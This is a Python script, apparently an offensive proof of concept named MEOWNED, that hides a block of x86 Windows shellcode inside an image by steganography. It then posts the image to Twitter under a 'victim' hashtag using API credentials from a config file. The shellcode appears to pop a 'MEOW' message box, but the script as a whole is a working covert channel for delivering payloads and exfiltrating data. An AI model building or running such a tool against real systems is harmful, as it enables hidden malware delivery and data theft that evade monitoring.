#!/usr/bin/python
"""MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
"""python -m pip install python-twitter"""
"""python -m pip install Stegano"""
"""python -m pip install pyyaml"""

import sys
import yaml
import twitter
import base64
from stegano import lsb

if len(sys.argv) != 4:
    sys.exit('Usage: meopwn_cli [victim_hashtag] [image to tweet] [secret message]')

# Import YAML
with open("conf.yaml", 'r') as stream:
    try:
        conf = yaml.load(stream)
    except yaml.YAMLError as exc:
        sys.exit("Error: Couldn't parse configuration file, check if conf.yaml exists.")

# Twitter API handler
api = twitter.Api(consumer_key=conf['twitter']['consumer_key'], 
    consumer_secret=conf['twitter']['consumer_secret'], 
    access_token_key=conf['twitter']['access_token_key'], 
    access_token_secret=conf['twitter']['access_token_secret'])

# Verify API credentials with twitter
try:
    api.VerifyCredentials()
    print("Twitter credentials are valid.")
except twitter.error.TwitterError as exc:
    sys.exit("Error: Couldn't authenticate with Twitter.")

# Hide the secret message

buf =  ""
buf += "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
buf += "\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
buf += "\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
buf += "\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
buf += "\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
buf += "\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
buf += "\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
buf += "\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
buf += "\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
buf += "\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
buf += "\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
buf += "\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
buf += "\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
buf += "\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
buf += "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
buf += "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
buf += "\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
buf += "\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x4d\x45\x4f"
buf += "\x57\x31\xc9\x88\x4c\x24\x04\x89\xe1\x31\xd2\x52\x53"
buf += "\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"

secret = lsb.hide("./source-imgs/" + sys.argv[2], buf)
secret.save("./output-imgs/" + sys.argv[2])

# Post message to Twitter
# status = api.PostUpdate( "CCC (Covert Cat Channel): ONLINE " + "#" + sys.argv[1],)
# print(status.text)



# Post image to Twitter
print("Tweeting image...")
status = api.PostMedia( "meow " + "#" + sys.argv[1], "./output-imgs/" + sys.argv[2])
print(status.text)

# clear_message = lsb.reveal("./output-imgs/" + sys.argv[2])
# print (clear_message)